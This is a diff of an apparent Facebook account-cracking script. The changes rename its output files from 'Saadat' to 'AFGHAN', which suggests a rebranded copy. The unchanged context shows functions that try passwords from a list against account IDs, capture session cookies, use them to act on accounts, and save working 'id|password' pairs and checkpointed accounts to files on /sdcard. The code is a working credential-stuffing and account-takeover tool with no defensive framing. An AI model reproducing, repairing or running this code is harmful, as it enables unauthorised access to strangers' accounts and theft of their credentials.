@@ -167,7 +167,8 @@ def cek_apk(session,coki):
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://free.facebook.com' + str(get), {
             'cookie': coki }, **('cookies',)).text
-	
+            
+            
 loop=0
 oks=[]
 cps=[]
@@ -737,13 +738,13 @@ def ffb(ids,names,passlist):
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				print('\r\r\033[1;32m [Saadat-OK] %s | %s'%(ids,pas))
-				open('/sdcard/Saadat-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				open('/sdcard/AFGHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
 					print('\r\r\x1b[38;5;208m [Saadat-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/Saadat-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					open('/sdcard/AFGHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -819,12 +820,12 @@ def rcrack1(ids,passlist):
 			if 'session_key' in q:
 				udx = str(q['uid'])
 				print('\r\r\033[1;32m [Saadat-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/Saadat-OK.txt', 'a').write(udx+'|'+pas+'\n')
+				open('/sdcard/AFGHAN-OK.txt', 'a').write(udx+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in q['error_msg']:
 				print('\r\r\x1b[38;5;208m [Saadat-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/Saadat-CP.txt','a').write(ids+'|'+pas+'\n')
+				open('/sdcard/AFGHAN-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
 			else:
@@ -880,7 +881,7 @@ def rcrack(ids,passlist):
 					else:
 						print(f'\r\x1b[1;32m [Saadat-OK] '+ids+' | '+pas)
 						cek_apk(session,coki)
-						open('/sdcard/Saadat-OK.txt', 'a').write(ids+'|'+pas+'\n')
+						open('/sdcard/AFGHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
 						oks.append(uid)
 						break
 			elif 'checkpoint' in log_cookies:
@@ -889,7 +890,7 @@ def rcrack(ids,passlist):
 				if uid in cps:pass
 				else:
 					print('\r\r\x1b[38;5;208m [Saadat-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/Saadat-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					open('/sdcard/AFGHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 			else:
